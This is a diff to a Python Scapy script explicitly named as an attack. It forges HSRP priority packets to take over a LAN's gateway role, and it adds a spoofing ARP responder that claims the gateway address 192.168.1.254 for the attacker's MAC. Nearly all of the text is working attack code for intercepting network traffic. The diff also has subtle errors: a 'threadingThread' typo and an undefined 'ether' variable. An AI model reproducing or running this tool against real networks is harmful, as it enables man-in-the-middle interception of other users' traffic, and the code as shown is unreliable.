@@ -29,12 +29,26 @@ class Attack:
         ip = IP(src=self.srcIP, dst='224.0.0.2')
         udp = UDP(sport=1985,dport=1985)
         hsrp = HSRP(group=self.group, priority=self.priority, virtualIP=self.vIP)
-        toSend = ip/udp/hsrp
+        toSend = ether/ip/udp/hsrp
         if (self.verbose == 1):
             toSend.show()
         send(toSend, iface=self.iface)
         self.send_garp()
         send(toSend, iface=self.iface, inter=3, loop=1)
+
+    def arp_responder(self,packet):
+        if (packet[ARP].op == 1 and packet.pdst == "192.168.1.254"):
+            replyARP = ARP(op=2, hwsrc=self.srcHW, psrc=packet.pdst, hwdst=packet[Ether].src, pdst=packet.psrc)
+            reply = Ether(dst=packet[Ether].src, src=self.srcHW) / replyARP
+            if(self.verbose == 1):
+                reply.show()
+            sendp(reply)
+        return
+
+    def arp_request_sniffer(self):
+        while True:
+            sniff(iface = self.iface, count = 1, filter = "arp", prn = self.arp_responder)
+
 
 def choose_attack():
     while (True):
@@ -102,8 +116,9 @@ def menu():
 
 if __name__  == "__main__":
     attack = menu()
-    hsrp_hack_t = threading.Thread(target=attack.hsrp_hack)
+    arp_sniff = threading.Thread(target=attack.arp_request_sniffer)
+    hsrp_hack_t = threadingThread(target=attack.hsrp_hack)
+    arp_sniff.start()
+    print("ARP responder started")
     hsrp_hack_t.start()
-    while(True):
-        time.sleep(5)
-        print("hello")
+    print("HSRP hack started")
